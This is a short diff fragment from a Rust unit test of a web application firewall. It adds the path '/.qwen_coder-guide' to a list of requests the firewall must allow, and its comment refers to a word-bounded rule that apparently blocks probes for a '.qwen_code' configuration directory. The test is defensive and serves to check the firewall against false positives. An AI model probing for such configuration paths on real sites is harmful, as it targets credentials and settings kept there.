+			"/.qwen_coder-guide",        // `.qwen_code` guarded by \b, "coder" tail stays clean
 		] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
